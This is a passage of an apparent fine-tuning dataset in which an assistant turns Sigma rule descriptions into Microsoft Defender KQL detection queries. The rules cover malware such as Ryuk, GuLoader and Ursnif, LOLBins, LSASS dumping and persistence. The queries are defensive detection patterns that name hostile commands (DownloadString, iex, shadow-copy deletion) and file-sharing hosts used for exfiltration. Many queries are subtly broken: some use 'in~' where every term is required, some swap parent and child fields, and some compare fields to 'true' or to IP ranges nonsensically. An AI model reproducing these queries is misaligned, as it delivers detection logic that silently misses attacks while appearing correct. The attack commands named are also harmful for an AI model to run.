\"\\\\AllFileSystemObjects\\\\ShellEx\\\\DragDropHandlers\" or RegistryKey contains \"\\\\ShellEx\\\\PropertySheetHandlers\" or RegistryKey contains \"\\\\ShellEx\\\\ContextMenuHandlers\") and (not(RegistryValueData =~ \"(Empty)\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects usage of base64 utility to decode arbitrary base64-encoded text Topic: proc_creation_macos_base64_decode"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where FolderPath =~ \"/usr/bin/base64\" and ProcessCommandLine =~ \"-d\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects specific command line argument being passed to a binary as seen being used by the malware Small Sieve. Topic: proc_creation_win_malware_small_sieve_cli_arg"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine endswith \".exe Platypus\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the command line executed when TeamViewer starts a session started by a remote host.\nOnce a connection has been started, an investigator can verify the connection details by viewing the \"incoming_connections.txt\" log file in the TeamViewer folder.\n Topic: proc_creation_macos_remote_access_tools_teamviewer_incoming_connection"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine endswith \"/TeamViewer_Desktop --IPCport 5939 --Module 1\" and InitiatingProcessFileName =~ \"/TeamViewer_Service\" and InitiatingProcessFolderPath =~ \"/TeamViewer_Desktop\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects when a built-in utility is used to decode and decrypt a payload after a macOS disk image (DMG) is executed. Malware authors may attempt to evade detection and trick users into executing malicious code by encoding and encrypting their payload and placing it in a disk image file. This behavior is consistent with adware or malware families such as Bundlore and Shlayer. Topic: proc_creation_macos_payload_decoded_and_decrypted"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"/Volumes/\", \"enc\", \"-base64\", \" -d \")) and InitiatingProcessFolderPath =~ \"/openssl\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the execution of a renamed version of the \"Mavinject\" process. Which can be abused to perform process injection using the \"/INJECTRUNNING\" flag Topic: proc_creation_win_renamed_mavinject"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessVersionInfoOriginalFileName in~ (\"mavinject32.exe\", \"mavinject64.exe\")) and (not((InitiatingProcessFolderPath in~ (\"\\\\mavinject32.exe\", \"\\\\mavinject64.exe\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects a network connection initiated by programs or processes running from suspicious or uncommon files system locations.\n Topic: net_connection_win_susp_initiated_uncommon_or_suspicious_locations"}, {"role": "assistant", "content": "DeviceNetworkEvents\n| where ((InitiatingProcessFolderPath contains \":\\\\$Recycle.bin\" or InitiatingProcessFolderPath contains \":\\\\Perflogs\\\\\" or InitiatingProcessFolderPath contains \":\\\\Temp\\\\\" or InitiatingProcessFolderPath contains \":\\\\Users\\\\Default\\\\\" or InitiatingProcessFolderPath contains \":\\\\Windows\\\\Fonts\\\\\" or InitiatingProcessFolderPath contains \":\\\\Windows\\\\IME\\\\\" or InitiatingProcessFolderPath contains \":\\\\Windows\\\\System32\\\\Tasks\\\\\" or InitiatingProcessFolderPath contains \":\\\\Windows\\\\Tasks\\\\\" or InitiatingProcessFolderPath contains \"\\\\config\\\\systemprofile\\\\\" or InitiatingProcessFolderPath contains \"\\\\Windows\\\\addins\\\\\") and InitiatingProcessId =~ \"true\") and (not((RemoteUrl in~ (\".githubusercontent.com\", \"anonfiles.com\", \"cdn.discordapp.com\", \"ddns.net\", \"dl.dropboxusercontent.com\", \"ghostbin.co\", \"glitch.me\", \"gofile.io\", \"hastebin.com\", \"mediafire.com\", \"mega.co.nz\", \"mega.nz\", \"onrender.com\", \"pages.dev\", \"paste.ee\", \"pastebin.com\", \"pastebin.pl\", \"pastetext.net\", \"portmap.io\", \"privatlab.com\", \"privatlab.net\", \"send.exploit.in\", \"sendspace.com\", \"storage.googleapis.com\", \"storjshare.io\", \"supabase.co\", \"temp.sh\", \"transfer.sh\", \"trycloudflare.com\", \"ufile.io\", \"w3spaces.com\", \"workers.dev\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects execution of \"certutil\" with the \"addstore\" flag in order to install a new certificate on the system.\nAdversaries may install a root certificate on a compromised system to avoid warnings when connecting to adversary controlled web servers.\n Topic: proc_creation_win_certutil_certificate_installation"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine contains \"-addstore\" or ProcessCommandLine contains \"/addstore\" or ProcessCommandLine contains \"\u2013addstore\" or ProcessCommandLine contains \"\u2014addstore\" or ProcessCommandLine contains \"\u2015addstore\") and ProcessCommandLine =~ \"root\" and (FolderPath endswith \"\\\\certutil.exe\" or ProcessVersionInfoOriginalFileName =~ \"CertUtil.exe\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the redirection of Ursnif discovery commands as part of the initial execution of the malware.\n Topic: proc_creation_win_malware_ursnif_cmd_redirection"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where InitiatingProcessFileName =~ \"\\\\explorer.exe\" and (ProcessCommandLine in~ (\"/C \") or (ProcessCommandLine contains \" >> \" and ProcessCommandLine contains \"\\\\AppData\\\\local\\\\temp*.bin\")) and InitiatingProcessFolderPath =~ \"\\\\cmd.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects Ryuk ransomware activity Topic: proc_creation_win_malware_ryuk"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"del /s /f /q c:\\\\\", \"*.bac\", \"*.bak\", \"*.bkf\")) or ((ProcessCommandLine in~ (\"samss\", \"audioendpointbuilder\", \"unistoresvc_\", \"AcrSch2Svc\")) and (InitiatingProcessFolderPath in~ (\"\\\\net.exe\", \"\\\\net1.exe\"))) or (ProcessCommandLine in~ (\"Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\", \"C:\\\\users\\\\Public\\\\\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects child processes of \"dfsvc\" which indicates a ClickOnce deployment execution. Topic: proc_creation_win_dfsvc_child_processes"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where InitiatingProcessFileName =~ \"\\\\dfsvc.exe\" and InitiatingProcessFolderPath =~ \"\\\\AppData\\\\Local\\\\Apps\\\\2.0\\\\\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects user accept agreement execution in psexec commandline Topic: proc_creation_win_sysinternals_psexec_execution"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where FolderPath endswith \"\\\\psexec.exe\" or ProcessVersionInfoOriginalFileName =~ \"psexec.c\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the pattern of UAC Bypass using IEInstal.exe (UACMe 64) Topic: proc_creation_win_uac_bypass_ieinstal"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where FolderPath contains \"\\\\AppData\\\\Local\\\\Temp\\\\\" and InitiatingProcessFileName =~ \"\\\\ieinstal.exe\" and (InitiatingProcessIntegrityLevel in~ (\"High\", \"System\", \"S-1-16-16384\", \"S-1-16-12288\")) and InitiatingProcessFolderPath =~ \"consent.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects deletion attempts of MacOS Time Machine backups via the native backup utility \"tmutil\".\nAn adversary may perform this action before launching a ransonware attack to prevent the victim from restoring their files.\n Topic: proc_creation_macos_tmutil_delete_backup"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine =~ \"delete\" and (FolderPath endswith \"/tmutil\" or ProcessCommandLine contains \"tmutil\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects outlvba (Microsoft VBA for Outlook Addin) DLL being loaded by the outlook process Topic: image_load_office_outlook_outlvba_load"}, {"role": "assistant", "content": "DeviceImageLoadEvents\n| where FolderPath endswith \"\\\\outlvba.dll\" and InitiatingProcessFolderPath =~ \"\\\\outlook.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects suspicious execution from ManageEngine as seen used by Mint Sandstorm Topic: proc_creation_win_apt_mint_sandstorm_manage_engine_susp_child_process"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (InitiatingProcessFileName =~ \"\\\\java\" and (InitiatingProcessFileName in~ (\"manageengine\", \"ServiceDesk\"))) and ((((ProcessCommandLine contains \" echo \" or ProcessCommandLine contains \"-dumpmode\" or ProcessCommandLine contains \"-ssh\" or ProcessCommandLine contains \".dmp\" or ProcessCommandLine contains \"add-MpPreference\" or ProcessCommandLine contains \"adscredentials\" or ProcessCommandLine contains \"bitsadmin\" or ProcessCommandLine contains \"certutil\" or ProcessCommandLine contains \"csvhost.exe\" or ProcessCommandLine contains \"DownloadFile\" or ProcessCommandLine contains \"DownloadString\" or ProcessCommandLine contains \"dsquery\" or ProcessCommandLine contains \"ekern.exe\" or ProcessCommandLine contains \"FromBase64String\" or ProcessCommandLine contains \"iex \" or ProcessCommandLine contains \"iex(\" or ProcessCommandLine contains \"Invoke-Expression\" or ProcessCommandLine contains \"Invoke-WebRequest\" or ProcessCommandLine contains \"localgroup administrators\" or ProcessCommandLine contains \"net group\" or ProcessCommandLine contains \"net user\" or ProcessCommandLine contains \"o365accountconfiguration\" or ProcessCommandLine contains \"query session\" or ProcessCommandLine contains \"samaccountname=\" or ProcessCommandLine contains \"set-MpPreference\" or ProcessCommandLine contains \"svhost.exe\" or ProcessCommandLine contains \"System.IO.Compression\" or ProcessCommandLine contains \"System.IO.MemoryStream\" or ProcessCommandLine contains \"usoprivate\" or ProcessCommandLine contains \"usoshared\" or ProcessCommandLine contains \"whoami\") or ProcessCommandLine matches regex \"[-/\u2013][Ee^]{1,2}[ncodema^]*\\\\s[A-Za-z0-9+/=]{15,}\") and (InitiatingProcessFolderPath in~ (\"\\\\powershell.exe\", \"\\\\powershell_ise.exe\"))) or (ProcessCommandLine =~ \"lsass\" and (ProcessCommandLine in~ (\"procdump\", \"tasklist\", \"findstr\"))) or ((ProcessCommandLine =~ \"http\" and InitiatingProcessFolderPath =~ \"\\\\curl.exe\") or (ProcessCommandLine in~ (\"localgroup Administrators\", \"/add\")) or (ProcessCommandLine in~ (\"user\", \"/add\")) or ((ProcessCommandLine contains \"reg add\" and ProcessCommandLine contains \"DisableAntiSpyware\" and ProcessCommandLine contains \"\\\\Microsoft\\\\Windows Defender\") or (ProcessCommandLine contains \"reg add\" and ProcessCommandLine contains \"DisableRestrictedAdmin\" and ProcessCommandLine contains \"CurrentControlSet\\\\Control\\\\Lsa\")) or (ProcessCommandLine in~ (\"E:jscript\", \"e:vbscript\")) or (ProcessCommandLine in~ (\"vssadmin\", \"delete\", \"shadows\")) or (ProcessCommandLine in~ (\"wbadmin\", \"delete\", \"catalog\")) or (ProcessCommandLine =~ \"http\" and InitiatingProcessFolderPath =~ \"\\\\wget.exe\") or (ProcessCommandLine in~ (\"wmic\", \"process call create\")) or (ProcessCommandLine in~ (\"wmic\", \"delete\", \"shadowcopy\")))) and (not((ProcessCommandLine in~ (\"download.microsoft.com\", \"manageengine.com\", \"msiexec\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the creation of diagcab file, which could be caused by some legitimate installer or is a sign of exploitation (review the filename and its location) Topic: file_event_win_susp_diagcab"}, {"role": "assistant", "content": "DeviceFileEvents\n| where FileName =~ \".diagcab\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the execution of installed GuLoader malware on the host.\nGuLoader is initiating network connections via the rundll32.exe process that is spawned via a browser parent(injected) process.\n Topic: proc_creation_win_malware_guloader_execution"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine endswith \"\\\\rundll32.exe\" and (InitiatingProcessFileName in~ (\"\\\\chrome.exe\", \"\\\\firefox.exe\", \"\\\\msedge.exe\")) and InitiatingProcessFolderPath =~ \"\\\\rundll32.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects usage of the Get-ADComputer cmdlet to collect computer information and output it to a file Topic: proc_creation_win_powershell_computer_discovery_get_adcomputer"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\" > \", \" | Select \", \"Out-File\", \"Set-Content\", \"Add-Content\")) and ((FolderPath endswith \"\\\\powershell.exe\" or FolderPath endswith \"\\\\pwsh.exe\") or (ProcessVersionInfoOriginalFileName in~ (\"PowerShell.EXE\", \"pwsh.dll\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects when a possible suspicious driver is being installed via pnputil.exe lolbin Topic: proc_creation_win_lolbin_susp_driver_installed_by_pnputil"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"-i\", \"/install\", \"-a\", \"/add-driver\", \".inf\")) and InitiatingProcessFolderPath =~ \"\\\\pnputil.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects inline execution of PowerShell code from a file Topic: proc_creation_win_powershell_exec_data_file"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"iex \", \"Invoke-Expression \", \"Invoke-Command \", \"icm \")) and ProcessCommandLine =~ \" -raw\" and (ProcessCommandLine in~ (\"cat \", \"get-content \", \"type \"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the execution of \"hh.exe\" to open \".chm\" files. Topic: proc_creation_win_hh_chm_execution"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine =~ \".chm\" and (ProcessVersionInfoOriginalFileName =~ \"HH.exe\" or FolderPath endswith \"\\\\hh.exe\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects changes to the Registry in which a monitor program gets registered to dump the memory of the lsass.exe process Topic: registry_event_silentprocessexit_lsass"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where RegistryKey contains \"Microsoft\\\\Windows NT\\\\CurrentVersion\\\\SilentProcessExit\\\\lsass.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detect potential persistence via the creation of an excel add-in (XLL) file to make it run automatically when Excel is started. Topic: registry_set_persistence_xll"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where RegistryKey endswith \"Software\\\\Microsoft\\\\Office*\" and RegistryKey endswith \"\\\\Excel\\\\Options\" and RegistryValueData startswith \"/R \" and RegistryValueData endswith \".xll\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the creation of binaries in the WinSxS folder by non-system processes Topic: file_event_win_susp_winsxs_binary_creation"}, {"role": "assistant", "content": "DeviceFileEvents\n| where FileName =~ \".exe\" and (not((InitiatingProcessFolderPath in~ (\"C:\\\\Windows\\\\Systems32\\\\\", \"C:\\\\Windows\\\\SysWOW64\\\\\", \"C:\\\\Windows\\\\WinSxS\\\\\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects tampering of RDP Terminal Service/Server sensitive settings.\nSuch as allowing unauthorized users access to a system via the fAllowUnsolicited or enabling RDP via fDenyTSConnections, etc.\n Topic: registry_set_terminal_server_suspicious"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where (RegistryKey endswith \"\\\\fDenyTSConnections\" or RegistryKey endswith \"\\\\fSingleSessionPerUser\" or RegistryKey endswith \"\\\\UserAuthentication\") and RegistryValueData =~ \"DWORD (0x00000000)\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects execution of \"reg.exe\" commands with the \"delete\" flag on services registry key. Often used by attacker to remove AV software services Topic: proc_creation_win_reg_delete_services"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine =~ \" delete \" and (FolderPath endswith \"reg.exe\" or ProcessVersionInfoOriginalFileName =~ \"reg.exe\") and ProcessCommandLine =~ \"\\\\SYSTEM\\\\CurrentControlSet\\\\services\\\\\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects usage of findstr with the \"EVERYONE\" or \"BUILTIN\" keywords.\nThis was seen being used in combination with \"icacls\" and other utilities to spot misconfigured files or folders permissions.\n Topic: proc_creation_win_findstr_recon_everyone"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((ProcessCommandLine in~ (\"\\\"Everyone\\\"\", \"'Everyone'\", \"\\\"BUILTIN\\\\\\\"\", \"'BUILTIN\\\\'\")) and ((FolderPath endswith \"\\\\find.exe\" or FolderPath endswith \"\\\\findstr.exe\") or (ProcessVersionInfoOriginalFileName in~ (\"FIND.EXE\", \"FINDSTR.EXE\")))) or (ProcessCommandLine in~ (\"icacls \", \"findstr \", \"Everyone\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects execution of the \"pbpaste\" utility, which retrieves the contents of the clipboard (a.k.a. pasteboard) and writes them to the standard output (stdout).\nThe utility is often used for creating new files with the clipboard content or for piping clipboard contents to other commands.\nIt can also be used in shell scripts that may require clipboard content as input.\nAttackers can abuse this utility in order to collect data from the user clipboard, which may contain passwords or sensitive information.\nUse this rule to hunt for potential abuse of the utility by looking at the parent process and any potentially suspicious command line content.\n Topic: proc_creation_macos_pbpaste_execution"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where InitiatingProcessFolderPath =~ \"/pbpaste\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Adversaries may execute their own malicious payloads by hijacking vulnerable file path references.\nAdversaries can take advantage of paths that lack surrounding quotations by placing an executable in a higher level directory within the path, so that Windows will choose the adversarys executable to launch.\n Topic: file_event_win_creation_unquoted_service_path"}, {"role": "assistant", "content": "DeviceFileEvents\n| where FileName =~ \"C:\\\\program.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects \"RegAsm.exe\" initiating a network connection to public IP adresses Topic: net_connection_win_regasm_network_activity"}, {"role": "assistant", "content": "DeviceNetworkEvents\n| where (InitiatingProcessId =~ \"true\" and InitiatingProcessFolderPath =~ \"\\\\regasm.exe\") and (not((InitiatingProcessRemoteSessionDeviceName in~ (\"127.0.0.0/8\", \"10.0.0.0/8\", \"172.16.0.0/12\", \"192.168.0.0/16\", \"169.254.0.0/16\", \"::1/128\", \"fe80::/10\", \"fc00::/7\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects execution from an Alternate Data Stream (ADS). Adversaries may use NTFS file attributes to hide their malicious data in order to evade detection Topic: proc_creation_win_susp_alternate_data_streams"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine =~ \"txt:\" and ((ProcessCommandLine in~ (\"esentutl \", \" /y \", \" /d \", \" /o \")) or (ProcessCommandLine in~ (\"makecab \", \".cab\")) or (ProcessCommandLine in~ (\"reg \", \" export \")) or (ProcessCommandLine in~ (\"regedit \", \" /E \")) or (ProcessCommandLine in~ (\"type \", \" > \")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects an image load pattern as seen when a tool named PRIVATELOG is used and rarely observed under legitimate circumstances Topic: image_load_usp_svchost_clfsw32"}, {"role": "assistant", "content": "DeviceImageLoadEvents\n| where FolderPath endswith \"\\\\clfsw32.dll\" and InitiatingProcessFolderPath =~ \"\\\\svchost.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects suspicious renamed SysInternals DebugView execution Topic: proc_creation_win_renamed_sysinternals_debugview"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessVersionInfoProductName =~ \"Sysinternals DebugView\" and (not((ProcessVersionInfoOriginalFileName =~ \"Dbgview.exe\" and InitiatingProcessFolderPath =~ \"\\\\Dbgview.exe\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects usage of bitsadmin downloading a file Topic: proc_creation_win_bitsadmin_download"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (FolderPath endswith \"\\\\bitsadmin.exe\" or ProcessVersionInfoOriginalFileName =~ \"bitsadmin.exe\") and (ProcessCommandLine =~ \" /transfer \" or ((ProcessCommandLine in~ (\" /create \", \" /addfile \")) and ProcessCommandLine =~ \"http\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects suspicious activity in which the MSExchangeMailboxReplication process writes .asp and .apsx files to disk, which could be a sign of ProxyShell exploitation Topic: file_event_win_susp_exchange_aspx_write"}, {"role": "assistant", "content": "DeviceFileEvents\n| where (FileName in~ (\".aspx\", \".asp\")) and InitiatingProcessFolderPath =~ \"\\\\MSExchangeMailboxReplication.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects suspicious ways to use the \"DumpMinitool.exe\" binary Topic: proc_creation_win_dumpminitool_susp_execution"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((FolderPath endswith \"\\\\DumpMinitool.exe\" or FolderPath endswith \"\\\\DumpMinitool.x86.exe\" or FolderPath endswith \"\\\\DumpMinitool.arm64.exe\") or (ProcessVersionInfoOriginalFileName in~ (\"DumpMinitool.exe\", \"DumpMinitool.x86.exe\", \"DumpMinitool.arm64.exe\"))) and ((not((FolderPath contains \"\\\\Microsoft Visual Studio\\\\\" or FolderPath contains \"\\\\Extensions\\\\\"))) or ProcessCommandLine =~ \".txt\" or ((ProcessCommandLine in~ (\" Full\", \" Mini\", \" WithHeap\")) and (not(ProcessCommandLine =~ \"--dumpType\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Remote.exe is part of WinDbg in the Windows SDK and can be used for AWL bypass and running remote files. Topic: proc_creation_win_lolbin_remote"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where FolderPath endswith \"\\\\remote.exe\" or ProcessVersionInfoOriginalFileName =~ \"remote.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects remote binary or command execution via the ScreenConnect Service.\nUse this rule in order to hunt for potentially anomalous executions originating from ScreenConnect\n Topic: proc_creation_win_remote_access_tools_screenconnect_child_proc"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where InitiatingProcessFileName =~ \"\\\\ScreenConnect.ClientService.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the default filename used in PoC code against print spooler vulnerability CVE-2021-1675 Topic: file_event_win_cve_2021_1675_printspooler"}, {"role": "assistant", "content": "DeviceFileEvents\n| where FileName =~ \"C:\\\\Windows\\\\System32\\\\spool\\\\drivers\\\\x64\\\\3\\\\old\\\\1\\\\123\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects changes to the Windows EventLog channel permission values. It focuses on changes to the Security Descriptor Definition Language (SDDL) string, as modifications to these values can restrict access to specific users or groups, potentially aiding in defense evasion by controlling who can view or modify a event log channel. Upon execution, the user shouldnt be able to access the event log channel via the event viewer or via utilities such as \"Get-EventLog\" or \"wevtutil\".\n Topic: registry_set_disable_windows_event_log_access"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where ((RegistryKey contains \"\\\\SYSTEM\\\\CurrentControlSet\\\\Services\\\\EventLog\\\\System\" and RegistryKey endswith \"\\\\CustomSD\") or ((RegistryKey contains \"\\\\Policies\\\\Microsoft\\\\Windows\\\\EventLog\\\\Setup\" or RegistryKey contains \"\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\WINEVT\\\\Channels\") and RegistryKey endswith \"\\\\ChannelAccess\")) and (RegistryValueData contains \"D:(D;\" or (RegistryValueData contains \"D:(\" and RegistryValueData contains \")(D;\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Sysmon registry detection of a local hidden user account. Topic: registry_event_add_local_hidden_user"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where InitiatingProcessFolderPath =~ \"\\\\lsass.exe\" and RegistryKey endswith \"\\\\SAM\\\\SAM\\\\Domains\\\\Account\\\\Users\\\\Names*\" and RegistryKey endswith \"$\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects chromium based browsers starting in headless and debugging mode and pointing to a user profile. This could be a sign of data stealing or remote control Topic: proc_creation_win_browsers_chromium_headless_debugging"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine in~ (\"--remote-debugging-\", \"--user-data-dir\", \"--headless\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the execution of a shell as sub process of \"rsync\" without the expected command line flag \"-e\" being used, which could be an indication of exploitation as described in CVE-2024-12084. This behavior is commonly associated with attempts to execute arbitrary commands or escalate privileges, potentially leading to unauthorized access or further exploitation.\n Topic: proc_creation_lnx_rsync_shell_spawn"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((InitiatingProcessFileName in~ (\"/rsync\", \"/rsyncd\")) and (InitiatingProcessFolderPath in~ (\"/ash\", \"/bash\", \"/csh\", \"/dash\", \"/ksh\", \"/sh\", \"/tcsh\", \"/zsh\"))) and (not(ProcessCommandLine =~ \" -e \"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects processes creating temp files related to PCRE.NET package Topic: file_event_win_pcre_net_temp_file"}, {"role": "assistant", "content": "DeviceFileEvents\n| where FileName =~ \"\\\\AppData\\\\Local\\\\Temp\\\\ba9ea7344a4a5f591d6e5dc32a13494b\\\\\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects potential DLL sideloading of an unsigned dbghelp.dll by the Sysinternals VMMap. Topic: image_load_side_load_vmmap_dbghelp_unsigned"}, {"role": "assistant", "content": "DeviceImageLoadEvents\n| where (FolderPath contains \"C:\\\\Debuggers\\\\dbghelp.dll\" and (InitiatingProcessFolderPath in~ (\"\\\\vmmap.exe\", \"\\\\vmmap64.exe\"))) and (not(InitiatingProcessVersionInfoCompanyName =~ \"true\"))"}]}
